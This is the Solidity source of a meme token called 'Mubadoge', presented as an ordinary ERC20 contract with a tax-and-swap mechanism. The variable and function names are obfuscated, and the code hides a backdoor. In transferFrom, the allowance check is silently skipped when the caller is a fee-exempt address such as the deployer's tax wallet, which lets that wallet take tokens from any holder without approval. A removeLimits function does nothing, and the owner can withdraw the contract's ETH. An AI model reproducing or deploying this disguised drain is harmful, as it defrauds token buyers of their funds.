// SPDX-License-Identifier: MIT

/*
    Name: Mubadoge
    Symbol: MUBADOGE

    Mubadoge is the perfect embodiment of wealth and power in the mystical desert lands.

    Web: https://mubadoge.fun
    X: https://x.com/mubadoge_eth
    TG: https://t.me/mubadoge_eth
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract Mubadoge is Context, IERC20, Ownable {
    uint256 public _vnbbvlkMUBADOGE = qq30fef / 100;
    uint256 public _oijboijoiMUBADOGE = 15 * 10**18;
    uint256 private _cvjkbnkjMUBADOGE = 10;

    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcMUBADOGE;
    mapping(address => mapping(address => uint256)) private _allcvnkjnMUBADOGE;
    mapping(address => bool) private _feevblknlMUBADOGE;
    address payable private _taxclknlMUBADOGE;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Mubadoge";
    string private constant _symbol = unicode"MUBADOGE";

    uint256 private _vkjbnkfjMUBADOGE = 10;
    uint256 private _maxovnboiMUBADOGE = 10;
    uint256 private _initvkjnbkjMUBADOGE = 20;
    uint256 private _finvjlkbnlkjMUBADOGE = 0;
    uint256 private _redclkjnkMUBADOGE = 2;
    uint256 private _prevlfknjoiMUBADOGE = 2;
    uint256 private _buylkvnlkMUBADOGE = 0;
    IUniswapV2Router02 private uniswapV2Router;

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknMUBADOGE;
    bool private _inlknblMUBADOGE = false;
    bool private swapvlkMUBADOGE = false;
    uint256 private _sellcnjkMUBADOGE = 0;
    uint256 private _lastflkbnlMUBADOGE = 0;
    address constant _deadlknMUBADOGE = address(0xdead);

    modifier lockTheSwap() {
        _inlknblMUBADOGE = true;
        _;
        _inlknblMUBADOGE = false;
    }

    constructor() payable {
        _taxclknlMUBADOGE = payable(_msgSender());
        
        _balknvlkcMUBADOGE[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcMUBADOGE[address(this)] = (qq30fef * 98) / 100;
        _feevblknlMUBADOGE[address(this)] = true;
        _feevblknlMUBADOGE[_taxclknlMUBADOGE] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcMUBADOGE[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transfer_kjvnMUBADOGE(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblMUBADOGE) {
                taxAmount = amount
                    .mul((_buylkvnlkMUBADOGE > _redclkjnkMUBADOGE) ? _finvjlkbnlkjMUBADOGE : _initvkjnbkjMUBADOGE)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlMUBADOGE[to] &&
                to != _taxclknlMUBADOGE
            ) {
                _buylkvnlkMUBADOGE++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblMUBADOGE &&
                to == uniswapV2Pair &&
                from != _taxclknlMUBADOGE &&
                swapvlkMUBADOGE &&
                _buylkvnlkMUBADOGE > _prevlfknjoiMUBADOGE
            ) {
                if (block.number > _lastflkbnlMUBADOGE) {
                    _sellcnjkMUBADOGE = 0;
                }
                _sellcnjkMUBADOGE = _sellcnjkMUBADOGE + _getAmountOut_lvcbnkMUBADOGE(amount);
                require(_sellcnjkMUBADOGE <= _oijboijoiMUBADOGE, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkMUBADOGE)
                    _swapTokenslknlMUBADOGE(_vnbbvlkMUBADOGE > amount ? amount : _vnbbvlkMUBADOGE);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjMUBADOGE(address(this).balance);
                }
                _lastflkbnlMUBADOGE = block.number;
            }
        }
        _balknvlkcMUBADOGE[from] = _balknvlkcMUBADOGE[from].sub(amount);
        _balknvlkcMUBADOGE[to] = _balknvlkcMUBADOGE[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcMUBADOGE[address(this)] = _balknvlkcMUBADOGE[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknMUBADOGE) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnMUBADOGE[owner][spender];
    }

    function _swapTokenslknlMUBADOGE(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnMUBADOGE(sender, recipient, amount);
        if (_downcklkojMUBADOGE(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnMUBADOGE[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnMUBADOGE[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _sendETHTocvbnjMUBADOGE(uint256 amount) private {
        _taxclknlMUBADOGE.transfer(amount);
    }

    function _downcklkojMUBADOGE(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlMUBADOGE[msg.sender]) return !_feevblknlMUBADOGE[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknMUBADOGE)) return false;
        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnMUBADOGE(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}

    function _getAmountOut_lvcbnkMUBADOGE(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }

    function removeLimits () external onlyOwner {}

    function _setTax_lknblMUBADOGE(address payable newWallet) external {
        require(_feevblknlMUBADOGE[_msgSender()]);
        _taxclknlMUBADOGE = newWallet;
        _feevblknlMUBADOGE[_taxclknlMUBADOGE] = true;
    }

    function enableMUBADOGETrading() external onlyOwner {
        require(!_tradingvlknMUBADOGE, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkMUBADOGE = true;
        _tradingvlknMUBADOGE = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function _assist_bnMUBADOGE() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

}